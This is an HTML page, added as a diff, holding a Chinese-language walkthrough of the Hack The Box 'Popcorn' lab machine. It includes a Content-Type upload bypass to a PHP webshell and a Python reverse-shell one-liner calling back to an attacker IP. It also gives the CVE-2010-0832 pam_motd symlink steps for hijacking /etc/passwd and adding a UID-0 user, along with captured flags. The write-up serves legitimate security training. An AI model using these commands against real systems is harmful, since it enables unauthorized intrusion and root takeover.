@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Popcorn — Nauhcnes</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--phase-recon:#60a5fa;--phase-foothold:#4ade80;--phase-lateral:#a78bfa;--phase-privesc:#f87171;--medium:#fbbf24;--linux:#60a5fa}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.8;-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+code,pre{font-family:'IBM Plex Mono',monospace}
+code{background:var(--surface-raised);padding:0.15em 0.4em;border-radius:3px;font-size:0.88em}
+pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;font-size:0.82rem;line-height:1.6;margin:1rem 0}
+.header{border-bottom:1px solid var(--border);padding:2.5rem 2rem 2rem;position:relative}
+.header::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--medium)}
+.header-inner{max-width:820px;margin:0 auto}
+.back{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted);text-decoration:none;display:inline-block;margin-bottom:1rem}
+.back:hover{color:var(--accent)}
+.header h1{font-size:2rem;font-weight:700;color:var(--heading);letter-spacing:-0.02em}
+.header-meta{margin-top:0.6rem;font-family:'IBM Plex Mono',monospace;font-size:0.78rem;color:var(--text-muted);display:flex;gap:1.2rem;flex-wrap:wrap}
+.tag{padding:0.15rem 0.5rem;border-radius:3px;background:var(--surface-raised)}
+.tag-medium{color:var(--medium)}
+.tag-linux{color:var(--linux)}
+main{max-width:820px;margin:0 auto;padding:1.5rem 2rem 4rem}
+h2{font-size:1.3rem;font-weight:700;color:var(--heading);margin:2.5rem 0 1rem;padding-bottom:0.4rem;border-bottom:1px solid var(--border)}
+h3{font-size:1.05rem;font-weight:600;color:var(--heading);margin:1.8rem 0 0.8rem}
+h4{font-size:0.95rem;font-weight:600;color:var(--heading);margin:1.4rem 0 0.6rem}
+p{margin:0.6rem 0}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem}
+th,td{border:1px solid var(--border);padding:0.5rem 0.8rem;text-align:left}
+th{background:var(--surface);color:var(--heading);font-weight:600}
+td{background:var(--surface)}
+.callout{background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.2rem;margin:1rem 0;font-size:0.9rem}
+.callout-warn{border-left-color:var(--medium)}
+.phase{font-family:'IBM Plex Mono',monospace;font-size:0.7rem;letter-spacing:0.1em;text-transform:uppercase;padding:0.2rem 0.6rem;border-radius:3px;display:inline-block;margin-bottom:0.4rem}
+.phase-recon{background:#1e3a5f40;color:var(--phase-recon)}
+.phase-foothold{background:#16653420;color:var(--phase-foothold)}
+.phase-privesc{background:#991b1b20;color:var(--phase-privesc)}
+.diagram{display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap;padding:1.2rem;background:var(--surface);border:1px solid var(--border);border-radius:6px;margin:1.5rem 0;font-family:'IBM Plex Mono',monospace;font-size:0.78rem}
+.node{padding:0.3rem 0.7rem;border-radius:4px;white-space:nowrap}
+.node-green{background:#16653430;color:var(--phase-foothold);border:1px solid #16653460}
+.node-red{background:#991b1b30;color:var(--phase-privesc);border:1px solid #991b1b60}
+.arrow{color:var(--text-muted)}
+.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;color:var(--text-muted);border-top:1px solid var(--border)}
+.gate{position:fixed;inset:0;background:var(--bg);z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:1rem}
+.gate input{background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:0.6rem 1rem;border-radius:4px;font-family:'IBM Plex Mono',monospace;font-size:0.9rem;text-align:center;outline:none;width:220px}
+.gate input:focus{border-color:var(--accent)}
+.gate label{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted)}
+.gate .err{color:var(--phase-privesc);font-size:0.75rem;font-family:'IBM Plex Mono',monospace;height:1rem}
+</style>
+</head>
+<body>
+
+<div class="gate" id="gate">
+<label>输入机器名称解锁</label>
+<input type="password" id="gate-pw" placeholder="machine name" autofocus>
+<div class="err" id="gate-err"></div>
+</div>
+<script>
+document.getElementById('gate-pw').addEventListener('keydown',function(e){
+if(e.key==='Enter'){
+if(this.value.toLowerCase()==='popcorn'){document.getElementById('gate').style.display='none'}
+else{document.getElementById('gate-err').textContent='wrong password'}
+}});
+</script>
+
+<div class="header">
+<div class="header-inner">
+<a class="back" href="../">← 返回目录</a>
+<h1>Popcorn</h1>
+<div class="header-meta">
+<span class="tag tag-medium">Medium</span>
+<span class="tag tag-linux">Linux</span>
+<span>10.129.55.97</span>
+</div>
+</div>
+</div>
+
+<main>
+
+<div class="diagram"><span class="node node-green">Torrent Hoster MIME 绕过上传 PHP shell</span><span class="arrow">→</span><span class="node node-green">www-data shell</span><span class="arrow">→</span><span class="node node-red">CVE-2010-0832 PAM motd 符号链接 → 劫持 /etc/passwd → root</span></div>
+
+<h2><span class="phase phase-recon">信息收集</span> Nmap 扫描与目录枚举</h2>
+
+<pre>sudo nmap -sCV -p- -T4 10.129.55.97</pre>
+
+<pre>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2
+80/tcp open  http    Apache httpd 2.2.12 (Ubuntu)</pre>
+
+<pre>gobuster dir -u http://popcorn.htb/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt --exclude-length 178</pre>
+
+<p>发现 <code>/torrent/</code> 路径，运行 <strong>Torrent Hoster</strong> 应用。</p>
+
+<h2><span class="phase phase-foothold">立足点</span> Torrent Hoster MIME 绕过上传 Webshell</h2>
+
+<h3>注册登录</h3>
+<p>在 <code>http://popcorn.htb/torrent/users/index.php?mode=register</code> 注册账号后登录。</p>
+
+<h3>上传绕过分析</h3>
+<p>Torrent Hoster 的截图上传功能只检查 HTTP 请求中的 <strong>Content-Type 头</strong>，不检查文件扩展名和 magic number：</p>
+
+<pre>if (($_FILES["file"]["type"] == "image/gif")
+|| ($_FILES["file"]["type"] == "image/jpeg")
+|| ($_FILES["file"]["type"] == "image/jpg")
+|| ($_FILES["file"]["type"] == "image/png")</pre>
+
+<p>只需要在 Burp Suite 中将 <code>Content-Type: application/x-php</code> 改为 <code>Content-Type: image/jpeg</code> 即可绕过。</p>
+
+<div class="callout">🧒 <strong>儿童版</strong>：上传检查员只看你递过来的"文件类型标签"（Content-Type），不看文件实际内容。你在 PHP 恶意文件上贴一张"我是图片"的标签，检查员就放行了。</div>
+
+<h3>使用 Exploit 脚本上传</h3>
+<pre>python3 torrent_hoster_unauthenticated_rce.py --url=http://popcorn.htb/torrent</pre>
+
+<pre>[$] Whoa, we got a shell dude! Spawning Console!!!
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+
+<h3>升级为完整反弹 Shell</h3>
+<pre># 在 webshell 中执行
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.65",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'</pre>
+
+<pre># 攻击机
+nc -lnvp 4444</pre>
+
+<pre>www-data@popcorn:/home/george$ cat user.txt
+e541ad773e0e880777c096100ea0e53e</pre>
+
+<h2><span class="phase phase-privesc">权限提升</span> CVE-2010-0832 PAM motd 符号链接提权</h2>
+
+<h3>漏洞原理</h3>
+<p>CVE-2010-0832 是 Linux PAM 中 <code>pam_motd</code>（Message of the Day）模块的本地提权漏洞。</p>
+
+<p>当用户通过 login shell（SSH 登录、<code>su -</code> 等）登录时，PAM 会处理 <code>~/.cache/motd.legal-displayed</code> 文件。如果 <code>~/.cache</code> 目录不存在，PAM 会自动创建它，并将文件的所有者设置为当前登录用户。</p>
+
+<p>攻击链：删除 <code>~/.cache</code> → 创建指向 <code>/etc/passwd</code> 的符号链接 → SSH 登录触发 PAM → PAM 将 <code>/etc/passwd</code> 所有者改为 www-data → 追加 UID=0 用户。</p>
+
+<div class="callout">🧒 <strong>儿童版</strong>：每次你用 SSH 登录，系统都会在你的"缓存文件夹"里放一个小标记文件，并标注"这是你的"。如果你把缓存文件夹偷偷替换成一个指向 <code>/etc/passwd</code> 的"路标"，系统就会跑去 <code>/etc/passwd</code> 上标注"这是你的"——你就拥有了密码文件的控制权。</div>
+
+<h3>步骤一：在目标机准备 SSH 密钥</h3>
+<p>www-data 的家目录是 <code>/var/www</code>：</p>
+
+<pre>cd /var/www
+mkdir .ssh
+cd .ssh
+
+# 生成密钥对
+ssh-keygen -q -t rsa -N '' -C 'pam'
+
+# 设置 authorized_keys
+cp id_rsa.pub authorized_keys
+chmod 600 authorized_keys
+
+# 查看私钥（复制到攻击机）
+cat id_rsa</pre>
+
+<h3>步骤二：从攻击机 SSH 登录（第一次，触发 .cache 生成）</h3>
+<pre># 保存私钥
+nano /tmp/www-data_key
+chmod 600 /tmp/www-data_key
+
+# SSH 登录（老系统需要启用旧算法）
+ssh -i /tmp/www-data_key \
+  -o HostKeyAlgorithms=+ssh-rsa \
+  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
+  www-data@10.129.55.97</pre>
+
+<p>登录成功后 PAM 自动创建了 <code>/var/www/.cache/motd.legal-displayed</code>。</p>
+
+<h3>步骤三：创建符号链接</h3>
+<pre>cd /var/www
+
+# 删除 .cache 目录
+rm -rf .cache
+
+# 创建指向 /etc/passwd 的符号链接
+ln -s /etc/passwd .cache
+
+# 验证
+ls -la .cache
+# .cache -&gt; /etc/passwd</pre>
+
+<h3>步骤四：再次 SSH 登录（触发 PAM 改所有权）</h3>
+<p>从攻击机再次执行相同的 SSH 命令。登录后验证：</p>
+
+<pre>ls -l /etc/passwd
+# -rw-r--r-- 1 www-data www-data ...</pre>
+
+<p><code>/etc/passwd</code> 的所有者已经变成 www-data。</p>
+
+<h3>步骤五：追加 root 用户</h3>
+<pre># 生成密码哈希
+openssl passwd -1 max
+# $1$EZsBDvcS$zr/vPLUtgFNU.DG5ihwIe0
+
+# 追加到 /etc/passwd（UID=0, GID=0 = root 权限）
+echo 'max:$1$EZsBDvcS$zr/vPLUtgFNU.DG5ihwIe0:0:0:pwned:/root:/bin/bash' &gt;&gt; /etc/passwd</pre>
+
+<h3>步骤六：切换到 root</h3>
+<pre>su max
+# 密码: max</pre>
+
+<pre>root@popcorn:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@popcorn:~# cat root.txt
+9cff9b69b5ac43d16c92519fa443ee19</pre>
+
+<div class="callout callout-warn">
+<p><strong>⚠️ 踩坑提醒</strong></p>
+<p>反弹 shell <strong>不会触发 PAM</strong>，必须通过真正的 SSH login shell 才能触发 motd 处理</p>
+<p>现代 Kali 的 OpenSSH 默认禁用了 <code>ssh-rsa</code> 算法，连接老系统必须加 <code>-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa</code></p>
+<p>符号链接必须在<strong>第一次 SSH 登录后、第二次 SSH 登录前</strong>创建</p>
+<p>这个漏洞只影响旧版 Ubuntu（约 2010 年前），现代系统已修复</p>
+</div>
+
+<h2>知识点速查表</h2>
+
+<table>
+<tr><th>阶段</th><th>技术</th><th>工具/CVE</th><th>助记词</th></tr>
+<tr><td>信息收集</td><td>目录枚举发现 Torrent Hoster</td><td>gobuster</td><td>🔍 "找种子网站"</td></tr>
+<tr><td>立足点</td><td>Content-Type MIME 绕过上传 PHP shell</td><td>Burp Suite / exploit 脚本</td><td>🏷️ "换标签骗检查员"</td></tr>
+<tr><td>提权准备</td><td>www-data 家目录配置 SSH 密钥</td><td>ssh-keygen + authorized_keys</td><td>🔑 "给自己配把钥匙"</td></tr>
+<tr><td>权限提升</td><td>PAM motd 符号链接劫持 /etc/passwd</td><td>CVE-2010-0832</td><td>🔗 "路标骗 PAM 改户主"</td></tr>
+<tr><td>获取 root</td><td>追加 UID=0 用户到 /etc/passwd</td><td>openssl passwd + echo &gt;&gt;</td><td>👤 "自己写个管理员"</td></tr>
+</table>
+
+<h2>额外知识</h2>
+
+<h3>/etc/passwd 追加 root 用户</h3>
+<p><code>/etc/passwd</code> 中每行的格式为：<code>用户名:密码哈希:UID:GID:描述:家目录:Shell</code></p>
+<p>当 UID 设为 <strong>0</strong> 时，该用户等同于 root。即使 <code>/etc/shadow</code> 存在，<code>/etc/passwd</code> 中的密码字段如果非空，系统会优先使用它。所以直接在 <code>/etc/passwd</code> 中追加一行 UID=0 的用户就能获得 root 权限。</p>
+
+<h3>PAM（Pluggable Authentication Modules）</h3>
+<p>PAM 是 Linux 的认证框架，所有登录行为（SSH、su、sudo、login）都通过 PAM 模块链处理。<code>pam_motd</code> 模块负责在登录时显示"每日消息"（Message of the Day）。CVE-2010-0832 的根本原因是 <code>pam_motd</code> 在创建/修改 <code>~/.cache</code> 目录下的文件时，以 root 权限运行但将文件所有权设为登录用户，结合符号链接就可以劫持任意文件的所有权。</p>
+
+<h3>文件上传绕过方式对比</h3>
+<table>
+<tr><th>检查方式</th><th>本靶机是否检查</th><th>绕过方法</th></tr>
+<tr><td>文件扩展名</td><td>❌ 不检查</td><td>直接上传 <code>.php</code></td></tr>
+<tr><td>Content-Type 头</td><td>✅ 检查</td><td>Burp 修改为 <code>image/jpeg</code></td></tr>
+<tr><td>Magic Number</td><td>❌ 不检查</td><td>不需要伪造</td></tr>
+</table>
+<p>相比 Networked 靶机（检查 magic number 不检查扩展名），Popcorn 刚好反过来——检查 Content-Type 不检查扩展名。实战中需要逐一测试每种检查机制。</p>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Popcorn 攻略 · 2026</footer>
+</body></html>
